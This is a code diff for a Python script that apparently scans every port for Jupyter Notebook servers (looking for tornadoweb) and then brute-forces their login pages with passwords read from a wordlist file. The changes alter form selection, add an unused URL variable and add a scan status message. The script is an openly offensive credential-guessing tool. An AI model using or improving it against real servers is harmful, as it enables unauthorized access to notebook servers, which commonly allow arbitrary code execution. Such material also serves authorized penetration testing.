@@ -73,11 +73,12 @@ def brute_login(ip, port, pass_file, sleep_s):
 	if re.search('Jupyter', check_for_jupyter):
 	
 		if re.search('/login', browser.get_url()): # Testing to see if we are prompted for login
+			formURI = browser.get_url().split("/")[3] # Future use maybe?
 			passwords=open(pass_file, "r")
 			pass_line = passwords.readlines()
 			for password in pass_line:
 
-				browser.select_form('form[action="/login?next=%2Ftree"]')
+				browser.select_form() # sometimes this crashes, dont know why
 				browser['password'] = password
 				browser.submit_selected()
 				
@@ -96,6 +97,8 @@ def brute_login(ip, port, pass_file, sleep_s):
 		return("...Not a Jupyter Notebook Server")
 
 def main():
+
+	print("Starting NMAP Scan for tornadoweb... This is scanning all ports 0-65535, please be patient...")
 
 	myargs = args()
 
